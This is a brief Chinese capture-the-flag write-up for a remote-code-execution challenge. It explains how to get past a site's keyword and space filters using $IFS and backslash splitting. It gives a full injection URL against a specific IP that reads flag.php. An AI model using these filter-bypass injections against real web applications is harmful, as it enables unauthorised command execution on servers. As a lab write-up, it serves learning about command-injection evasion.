## 题目描述

RCE, remote code execution，泛指能在远端机器上执行任意代码的情况。可是网站管理员添加了种种入侵检测，这该如何是好？

## 题解

一个比较基础的命令执行绕过trick，空格被过滤可用	`$IFS`，可通过`\`来绕过对关键词的过滤

![image-20210921140203388](C:\Users\Cys\AppData\Roaming\Typora\typora-user-images\image-20210921140203388.png)

`http://47.93.215.154:5000/?rce=ca\t$IFS./f\lag.php`

![image-20210921140310843](C:\Users\Cys\AppData\Roaming\Typora\typora-user-images\image-20210921140310843.png)